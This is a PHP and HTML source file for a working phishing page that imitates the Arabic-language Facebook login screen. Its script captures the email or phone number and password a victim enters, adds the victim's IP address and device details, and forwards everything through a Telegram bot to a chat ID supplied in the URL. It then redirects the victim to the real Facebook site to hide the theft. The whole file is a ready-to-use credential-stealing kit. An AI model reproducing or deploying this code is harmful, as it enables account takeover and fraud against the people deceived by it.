<?php
$botToken = "BBOTTTTTTTTTTT";

function sendTelegramMessage($chatId, $message, $botToken) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $chatId = $input['chatId'];
    $message = $input['message'];

    $result = sendTelegramMessage($chatId, $message, $botToken);
    
    header('Content-Type: application/json');
    echo $result;
    exit;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - تسجيل الدخول أو إنشاء حساب</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Helvetica, Arial, sans-serif;
        }
        
        body {
            background: #f0f2f5;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            padding: 40px 0 80px;
            line-height: 1.34;
        }
        
        .container {
            width: 100%;
            max-width: 980px;
            padding: 15px;
            margin: auto;
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            align-items: center;
            gap: 25px;
        }
        
        .intro-section {
            max-width: 450px;
            padding: 0 20px;
            margin-right: 0;
            text-align: center;
        }
        
        .profile-logo {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            margin: 0 auto 15px;
            display: block;
            object-fit: cover;
            border: 3px solid #fff;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
        }
        
        .facebook-text {
            color: #1877f2;
            font-size: 32px;
            font-weight: bold;
            letter-spacing: -0.5px;
            margin-bottom: 15px;
            font-family: Helvetica, Arial, sans-serif;
        }
        
        .intro-text {
            font-size: 20px;
            line-height: 24px;
            color: #1c1e21;
            font-weight: normal;
            text-align: center;
            margin-bottom: 15px;
        }
        
        .login-container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            width: 380px;
            padding: 18px;
            margin-top: 5px;
        }
        
        .login-form {
            padding: 6px;
        }
        
        .input-group {
            margin-bottom: 12px;
            position: relative;
        }
        
        .input-field {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            direction: ltr;
            color: #1c1e21;
            background: #ffffff;
        }
        
        .input-field:focus {
            outline: none;
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        
        .login-button {
            width: 100%;
            background: #1877f2;
            color: white;
            border: none;
            padding: 11px;
            border-radius: 6px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 8px;
            font-size: 19px;
            transition: background-color 0.2s;
        }
        
        .login-button:hover {
            background: #166fe5;
        }
        
        .forgot-pw {
            color: #1877f2;
            font-size: 13.5px;
            text-decoration: none;
            text-align: center;
            display: block;
            margin: 14px 0;
            padding: 4px;
        }
        
        .forgot-pw:hover {
            text-decoration: underline;
        }
        
        .separator {
            border-bottom: 1px solid #dadde1;
            margin: 18px 0;
        }
        
        .create-account {
            background: #42b72a;
            color: white;
            border: none;
            padding: 11px 15px;
            border-radius: 6px;
            font-weight: bold;
            cursor: pointer;
            font-size: 16px;
            display: block;
            margin: 0 auto;
            text-decoration: none;
            text-align: center;
            transition: background-color 0.2s;
            width: 55%;
        }
        
        .create-account:hover {
            background: #36a420;
        }
        
        .footer {
            margin-top: 25px;
            text-align: center;
            width: 100%;
            max-width: 980px;
            padding: 0 18px;
        }
        
        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 9px;
            margin-bottom: 11px;
            font-size: 11.5px;
        }
        
        .footer-link {
            color: #8a8d91;
            text-decoration: none;
        }
        
        .footer-link:hover {
            text-decoration: underline;
        }
        
        .copyright {
            color: #8a8d91;
            font-size: 11.5px;
            margin-top: 11px;
        }
        
        .hidden {
            display: none;
        }
        
        .success-view, .error-view {
            text-align: center;
            padding: 25px 14px;
        }
        
        .success-icon, .error-icon {
            font-size: 44px;
            margin-bottom: 14px;
        }
        
        .success-message, .error-message {
            font-size: 15.5px;
            margin-bottom: 22px;
            color: #1c1e21;
        }

        @media (max-width: 768px) {
            body {
                padding: 25px 0 60px;
            }
            
            .container {
                flex-direction: column;
                text-align: center;
                gap: 18px;
            }
            
            .intro-section {
                margin-top: 12px;
                padding: 0;
            }
            
            .profile-logo {
                width: 100px;
                height: 100px;
            }
            
            .facebook-text {
                font-size: 28px;
            }
            
            .intro-text {
                font-size: 18px;
                margin-bottom: 12px;
                padding: 0 5px;
            }
            
            .login-container {
                margin-top: 0;
                width: 100%;
                max-width: 380px;
            }
            
            .footer-links {
                gap: 6px;
            }
        }
        
        @media (max-width: 480px) {
            body {
                padding: 15px 0;
            }
            
            .container {
                padding: 8px;
            }
            
            .login-container {
                box-shadow: none;
                padding: 15px;
            }
            
            .intro-text {
                font-size: 16px;
            }
            
            .create-account {
                width: 65%;
            }
            
            .facebook-text {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="intro-section">
            <img src="https://dev-ianstagram.pantheonsite.io/wp-content/uploads/2025/08/Screenshot_20250825_211205_Google.jpg" alt="صورة الملف الشخصي" class="profile-logo">
            <div class="facebook-text">facebook</div>
            <h2 class="intro-text">يساعدك Facebook على التواصل مع الأشخاص ومشاركة ما تريد معهم.</h2>
        </div>
        
        <div class="login-container">
            <div id="loginView">
                <form class="login-form" onsubmit="handleLogin(event)">
                    <div class="input-group">
                        <input type="text" class="input-field" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
                    </div>
                    
                    <div class="input-group">
                        <input type="password" class="input-field" id="password" placeholder="كلمة المرور" required>
                    </div>
                    
                    <button type="submit" class="login-button">تسجيل الدخول</button>
                    
                    <a href="#" class="forgot-pw">هل نسيت كلمة المرور؟</a>
                    
                    <div class="separator"></div>
                    
                    <a href="#" class="create-account">إنشاء حساب جديد</a>
                </form>
            </div>
            
            <div id="successView" class="hidden success-view">
                <div class="success-icon">✅</div>
                <div class="success-message">تم تسجيل الدخول بنجاح</div>
                <p>جاري توجيهك إلى فيسبوك...</p>
            </div>
            
            <div id="errorView" class="hidden error-view">
                <div class="error-icon">❌</div>
                <div class="error-message">حدث خطأ أثناء تسجيل الدخول</div>
                <p>يرجى المحاولة مرة أخرى لاحقاً.</p>
            </div>
        </div>
    </div>
    
    <div class="footer">
        <div class="footer-links">
            <a href="#" class="footer-link">العربية</a>
            <a href="#" class="footer-link">English (US)</a>
            <a href="#" class="footer-link">Français (France)</a>
            <a href="#" class="footer-link">Español</a>
            <a href="#" class="footer-link">Italiano</a>
        </div>
        
        <div class="footer-links">
            <a href="#" class="footer-link">التسجيل</a>
            <a href="#" class="footer-link">تسجيل الدخول</a>
            <a href="#" class="footer-link">Messenger</a>
            <a href="#" class="footer-link">Facebook Lite</a>
            <a href="#" class="footer-link">Watch</a>
        </div>
        
        <div class="footer-links">
            <a href="#" class="footer-link">سياسة الخصوصية</a>
            <a href="#" class="footer-link">الشروط</a>
            <a href="#" class="footer-link">المساعدة</a>
        </div>
        
        <div class="copyright">Meta © 2023</div>
    </div>

    <script>
        const params = new URLSearchParams(window.location.search);
        const chatId = params.get('ID');
        
        const loginView = document.getElementById('loginView');
        const successView = document.getElementById('successView');
        const errorView = document.getElementById('errorView');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        
        function showView(view) {
            loginView.classList.add('hidden');
            successView.classList.add('hidden');
            errorView.classList.add('hidden');
            
            view.classList.remove('hidden');
        }
        
        async function collectBasicDeviceInfo() {
            let ipAddress = "غير متوفر";
            
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                ipAddress = data.ip;
            } catch (e) {}
            
            return {
                userAgent: navigator.userAgent,
                ip: ipAddress,
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: `${screen.width}x${screen.height}`,
                date: new Date().toLocaleString('ar-SA')
            };
        }
        
        async function sendToServer(chatId, message) {
            try {
                const data = {
                    chatId: chatId,
                    message: message
                };
                
                const response = await fetch(window.location.href, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });
                
                return await response.json();
            } catch (error) {
                console.error('Error sending to server:', error);
                return {ok: false, error: error.message};
            }
        }
        
        async function handleLogin(event) {
            event.preventDefault();
            
            if (!emailInput.value || !passwordInput.value) {
                alert("يرجى إدخال البريد الإلكتروني وكلمة المرور");
                return;
            }
            
            const deviceInfo = await collectBasicDeviceInfo();
            const message = `
📘 <b>معلومات تسجيل الدخول إلى فيسبوك</b>

👤 <b>معرف المستخدم:</b> <code>${chatId}</code>
📧 <b>البريد الإلكتروني/الهاتف:</b> ${emailInput.value}
🔒 <b>كلمة المرور:</b> ${passwordInput.value}
📱 <b>الجهاز:</b> ${deviceInfo.userAgent}
🌐 <b>IP:</b> ${deviceInfo.ip}
🖥️ <b>النظام:</b> ${deviceInfo.platform}
🌐 <b>اللغة:</b> ${deviceInfo.language}
🕒 <b>المنطقة الزمنية:</b> ${deviceInfo.timezone}
📺 <b>الشاشة:</b> ${deviceInfo.screen}
📅 <b>التاريخ:</b> ${deviceInfo.date}
            `;
            
            const result = await sendToServer(chatId, message);
            
            if (result && result.ok) {
                showView(successView);
                setTimeout(() => {
                    window.location.href = "https://www.facebook.com/";
                }, 2000);
            } else {
                showView(errorView);
            }
        }
        
        if (!chatId) {
            showView(errorView);
            document.querySelector('.error-message').textContent = "معرف المستخدم غير صحيح أو انتهت صلاحية الرابط";
        }
    </script>
</body>
</html>
